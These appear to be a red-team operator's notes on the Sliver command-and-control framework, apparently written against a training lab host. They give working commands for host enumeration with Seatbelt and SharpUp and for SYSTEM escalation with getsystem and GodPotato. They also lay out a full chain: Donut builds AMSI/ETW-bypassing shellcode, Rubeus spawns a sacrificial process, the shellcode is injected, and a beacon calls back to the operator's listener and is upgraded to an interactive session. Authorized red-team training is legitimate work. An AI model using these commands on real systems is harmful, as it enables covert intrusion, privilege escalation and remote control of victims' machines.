As red team operators, we need to be as silent and conscious as possible to avoid triggering any alarms or suspicions.
## Aliases and Extensions
Besides `Sliver`'s built-in commands, we can extend its features by adding new commands via the `armory` or crafting third-party tools

[Aliases & Extensions wiki](https://github.com/BishopFox/sliver/wiki/Aliases-&-Extensions), there are differences between `aliases` and `extensions`
	`Alias` - think of it as a wrapper of a library. ie run it secretly inside another
	`Extension` - similar to alias but has specific callback instructions to C2

#### Enumeration 
Both execute-assembly & armory can be used to do similar stuff as shown below. Use case? We have custom .NET binaries we compiled ourself.

`seatbelt` - enumerate environment
`sharup` - enumerate privileges, registries, unquoted service paths, etc...

> **NOTE:** Upon executing tools, we must prepend with `--` after tool's name to let Sliver know there won't be more arguments, followed by arguments the tool supports.

Commands
```bash
getsystem    # If you are local admin, you can get SYSTEM immediately (usually...)
```

Tools 
```bash
sliver > armory install all     # install tools from armory. breaks old versions.

# Seatbelt
sliver > seatbelt -- -group=all   # running seatbelt via armory
# Seatbelt via execute-assembly
git clone https://github.com/Flangvik/SharpCollection
sliver > execute-assembly [--process <process>] /path/to/Seatbelt.exe -group=system # running seatbelt 


# Sharpup
sliver > sharpup -- audit
```

Privesc example with Godpotato
```bash
# Godpotato example of priv esc (SeImpersonatePrivilege)
sliver > execute-assembly [--process <process>] /path/to/GodPotato-NET4.exe -cmd "cmd /c whoami"
```
> See Donut for shellcode injection for a rev shell

## Donut
[Donut](https://github.com/TheWover/donut) is a tool focused on creating binary shellcodes that can be executed in memory. Donut will generate shellcode of a .NET binary, which can be executed via `execute-shellcode`

```bash
# Setup
git clone https://github.com/TheWover/donut
cd donut/
make -f Makefile
./donut    # run

# Create either an `http` or `mtls` beacon(s). 
sliver > generate beacon --http 10.10.15.5:9002 -N http-beacon

# Upload implant 
sliver > upload http-beacon.exe

# Start listener
sliver > http --lhost 10.10.15.5 --lport 9002

# Generate binary shellcode
./donut -i /path/to/GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o /path/to/shellcode.bin
	# -i : file to be executed in memory
	# -a : architecture (2 = amd64)
	# -b : bypass AMSI/WLDP/ETW (2= abort on fail)
	# -p : arguments passed into file executed in memory (godpotato)
	# -o : output

# Create sacrifical process (with Rubeus)
sliver > execute-assembly /path/to/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe   # can be any process
	# Make note of PID

# Inject shellcode
sliver > execute-shellcode -p <PID> /path/to/shellcode.bin
sliver > ps -e <process_name>    # monitor state

# Catch new beacon - looks like this
[*] Beacon 46d73efb http-beacon - 10.129.205.226:50838 (web01) - windows/amd64 - Mon, 16 Oct 2023 10:35:12 BST

# Upgrade to interactive session
sliver> beacons        # Check what beacons are active
sliver> use <ID>       # Use a beacon
sliver> interactive    # Turn beacon into session (we have to switch to it next)
sliver> sessions       # Check what sessions are active
sliver> use <ID>       # Use session
```